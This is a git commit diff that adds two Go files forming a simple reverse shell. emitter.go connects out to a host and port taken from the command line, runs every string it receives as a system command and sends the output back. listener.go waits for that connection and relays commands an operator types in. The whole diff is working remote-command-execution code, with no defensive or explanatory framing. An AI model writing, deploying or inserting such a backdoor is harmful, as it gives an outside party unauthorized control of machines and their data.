26b62096c28fe20b33dd8c2256b04dc1994af62b
apurbadh <erikduke182@gmail.com>
2021-10-13 18:47:13 +0545

    listening and emitting with command execution finished

--- emitter.go
+++ emitter.go
@@ -1,5 +1,26 @@
 package main
 
-func emit() {
+import (
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+)
 
+func emit() {
+	conn, err := net.Dial("tcp", os.Args[2])
+
+	if err != nil {
+		fmt.Println("Error connecting to the server")
+	}
+
+	for {
+		buf := make([]byte, 1024)
+		n, err := conn.Read(buf)
+		data := string(buf[:n])
+		if err == nil {
+			out, _ := exec.Command(data).Output()
+			conn.Write(out)
+		}
+	}
 }
--- listener.go
+++ listener.go
@@ -1,5 +1,41 @@
 package main
 
-func listen() {
+import (
+	"fmt"
+	"net"
+	"os"
+)
 
+func listen() {
+	dstream, err := net.Listen("tcp", ":"+os.Args[2])
+
+	if err != nil {
+		fmt.Println(err)
+		return
+	}
+	fmt.Println("Listening at Port " + os.Args[2])
+	defer dstream.Close()
+
+	for {
+		conn, err := dstream.Accept()
+		if err != nil {
+			fmt.Println(err)
+			return
+		}
+		go handle(conn)
+	}
+}
+
+func handle(con net.Conn) {
+	var command string
+	for {
+		fmt.Print("Command : ")
+		fmt.Scan(&command)
+		con.Write([]byte(command))
+		buf := make([]byte, 1024)
+		n, _ := con.Read(buf)
+		data := string(buf[:n])
+		fmt.Print(data)
+
+	}
 }
